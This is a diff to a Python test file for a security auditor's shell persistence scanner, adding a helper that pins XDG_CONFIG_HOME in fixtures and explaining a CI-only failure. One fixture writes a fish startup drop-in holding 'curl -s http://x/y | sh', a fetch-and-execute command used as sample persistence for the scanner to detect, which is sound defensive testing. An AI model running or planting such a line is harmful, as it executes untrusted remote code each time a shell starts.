@@ -6,6 +6,7 @@ whether credential rotation is safe. Exit `3` encodes rotation-unsafe. Offline, 
 from __future__ import annotations
 
 import ast
+import contextlib
 import inspect
 import os
 import tempfile
@@ -24,6 +25,14 @@ from stayawake.bots.security.hygiene.models import (
     ROTATION_UNSAFE_PERSISTENCE, ROTATION_UNSAFE_UNKNOWN)
 from stayawake.cli.commands import audit as audit_cmd
 from stayawake.bots.security.sinks import render as sink_render
+
+
+@contextlib.contextmanager
+def _config_home(home):
+    """Point the XDG/zsh location variables at a fixture home, whatever the ambient environment is."""
+    with mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": str(home / ".config")}):
+        os.environ.pop("ZDOTDIR", None)
+        yield
 
 
 def _issue(id_, severity="warning"):
@@ -386,9 +395,7 @@ class TestTheCertifiedSurfaceIsTheScannedSurface(unittest.TestCase):
         confd = home / ".config" / "fish" / "conf.d"
         confd.mkdir(parents=True)
         (confd / "99-evil.fish").write_text("curl -s http://x/y | sh\n")
-        with mock.patch.dict(os.environ, {}, clear=False), \
-             mock.patch.object(Path, "home", staticmethod(lambda: home)):
-            os.environ.pop("XDG_CONFIG_HOME", None)
+        with _config_home(home), mock.patch.object(Path, "home", staticmethod(lambda: home)):
             read = [p.name for p in coverage.mechanism._iter_shell_rc()]
         self.assertIn("99-evil.fish", read, "a conf.d drop-in is sourced on every shell start")
 
@@ -397,7 +404,10 @@ class TestTheCertifiedSurfaceIsTheScannedSurface(unittest.TestCase):
         self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
         (home / ".config" / "fish").mkdir(parents=True)
         (home / ".config" / "fish" / "config.fish").write_text("fish_add_path /opt/homebrew/bin\n")
-        with mock.patch.object(Path, "home", staticmethod(lambda: home)):
+        # $XDG_CONFIG_HOME has to be controlled, not inherited: the resolver honours it (correctly —
+        # it is where fish itself looks), and a CI runner sets it to somewhere unrelated to this
+        # fixture, which is how this passed locally and failed on every runner.
+        with _config_home(home), mock.patch.object(Path, "home", staticmethod(lambda: home)):
             self.assertEqual([i.id for i in coverage.check_persistence_coverage()], [])
 
 
